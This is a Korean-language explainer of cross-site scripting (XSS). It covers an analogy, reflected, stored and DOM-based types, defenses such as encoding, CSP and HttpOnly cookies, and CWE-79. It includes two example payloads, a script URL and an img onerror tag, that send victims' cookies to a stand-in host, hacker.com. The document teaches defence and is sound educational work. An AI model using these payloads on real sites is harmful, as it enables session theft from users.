# XSS (Cross-Site Scripting) — 보안 용어 해설

> **생성일**: 2026-06-10

## Step 1: 단어 직역 및 쉬운 비유

### 약자 풀이

**XSS** = **C**ross-**S**ite **S**cripting

| 약자 구성 | 원래 단어 | 뜻 |
|-----------|-----------|-----|
| **C** | **Cross** | 교차, 가로지르다 |
| **S** | **Site** | 사이트 (웹사이트) |
| **S** | **Scripting** | 스크립트(작은 프로그램)를 실행하는 행위 |

### 의미 조합

> **"서로 다른 웹사이트를 가로질러 악성 스크립트를 실행하게 하는 공격 기법"**

### 강력한 비유

**"식당 직원으로 위장한 배달 사기꾼"**

1. **해커(=나쁜 손님)**: 식당 **메뉴판(=게시판/댓글창)** 에 "주문과 함께 **물 한 잔에다 수면제를 타서** 갖다 주세요"라고 적어 놓습니다. (악성 스크립트를 게시물에 심음)

2. **식당 주인(=웹 서버)**: 그 **메뉴판 내용을 그대로** 다음 손님에게 전달합니다. 주인은 손님이 주문한 내용이 수상한지 아닌지 **전혀 확인하지 않아요**. (서버는 입력값을 검증 없이 그대로 출력)

3. **피해자(=일반 손님)**: 식당에 와서 메뉴판을 보는데, 거기 적힌 대로 **물에 수면제를 탄 음료**를 받아 마시게 됩니다. 피해자는 **"이 식당이 시키는 거니까 안전하겠지"** 라고 믿었지만, 사실 그 내용은 **전혀 다른 손님이 심어 놓은 것**이었습니다.

4. **결과**: 피해자는 정신을 잃고, 해커는 피해자의 **지갑(=쿠키, 세션 토큰)**, **휴대폰(=개인정보)** 등을 마음대로 가져갑니다.

## Step 3: 전문 용어 설명

### 정의

**사이트 간 스크립팅 (Cross-Site Scripting, XSS)** 은 웹 애플리케이션에서 가장 많이 나타나는 취약점 중 하나로, **웹사이트 관리자가 아닌 공격자가 웹 페이지에 악성 스크립트를 삽입할 수 있는 취약점**입니다. 명칭이 XSS인 이유는 웹 기술인 CSS(Cascading Style Sheets)와의 혼동을 피하기 위함입니다.

### 공격 원리

XSS는 웹 애플리케이션이 **사용자로부터 입력받은 값을 제대로 검사하지 않고 그대로 출력**할 때 발생합니다. 공격자는 `<script>` 태그나 이벤트 핸들러(`onerror`, `onload` 등)가 포함된 악성 입력값을 서버에 전송하고, 이를 다른 사용자가 조회할 때 브라우저에서 해당 스크립트가 실행됩니다.

이 취약점으로 해커는 다음을 수행할 수 있습니다:
- 사용자의 **쿠키(Cookie)** 및 **세션(Session)** 정보 탈취
- 페이지 내용 **변조**
- 사용자를 피싱 사이트로 **리다이렉션**
- 사용자 권한으로 **비정상적인 기능 수행**

### 공격 유형

#### 1. 반사형 XSS (Reflected XSS / Non-persistent)

- 공격자가 제공한 악성 스크립트가 **서버에 저장되지 않고**, HTTP 요청(URL 파라미터, 검색어 등)에 포함되어 즉시 응답 페이지에 반영되어 실행되는 유형
- 피해자가 **악성 URL을 클릭**해야만 동작
- 대표적 대상: **검색 엔진**

```
예: http://victim.com/search?q=<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>
```

#### 2. 저장형 XSS (Stored XSS / Persistent)

- 악성 스크립트가 **서버에 영구적으로 저장**된 후, 다른 사용자가 해당 페이지를 조회할 때마다 실행되는 유형
- 가장 **치명적인 XSS** — 피해자가 별도의 조작 없이도 공격에 노출됨
- 대표적 대상: **게시판, 방명록, 댓글, 프로필**

```
게시글 내용에 다음 코드를 삽입:
<img src="#" width="0" height="0" onerror="this.src='http://hacker.com/steal?cookie='+encodeURIComponent(document.cookie)" />
→ 다른 사용자가 게시글을 열람할 때마다 쿠키가 해커 서버로 전송됨
```

#### 3. DOM 기반 XSS (DOM-based XSS)

- 서버 응답에는 악성 코드가 포함되지 않지만, 클라이언트 측 **JavaScript가 DOM을 동적으로 처리하는 과정**에서 취약점이 발생
- 공격 페이로드가 서버를 거치지 않고 **브라우저에서 직접 실행**
- 감지가 가장 어려운 유형

### 방어 방법

| 방어 기법 | 설명 |
|-----------|------|
| **HTML 인코딩** | `<`, `>`, `&`, `"`, `'` 등을 `&lt;`, `&gt;`, `&amp;`, `&quot;` 등으로 변환 |
| **CSP (Content Security Policy)** | HTTP 응답 헤더에 `Content-Security-Policy`를 설정하여 특정 출처의 스크립트만 실행 허용 |
| **입력값 검증** | 화이트리스트 방식으로 허용된 문자만 입력받음 |
| **HttpOnly 쿠키** | 쿠키에 `HttpOnly` 플래그를 설정하여 JavaScript에서 `document.cookie` 접근 차단 |
| **프레임워크의 자동 이스케이프** | React의 JSX, Vue의 템플릿 등 현대 프레임워크는 기본적으로 출력값을 이스케이프 처리 |

### 요약

| 구분 | 내용 |
|------|------|
| **CVE 분류** | CWE-79 (Improper Neutralization of Input During Web Page Generation) |
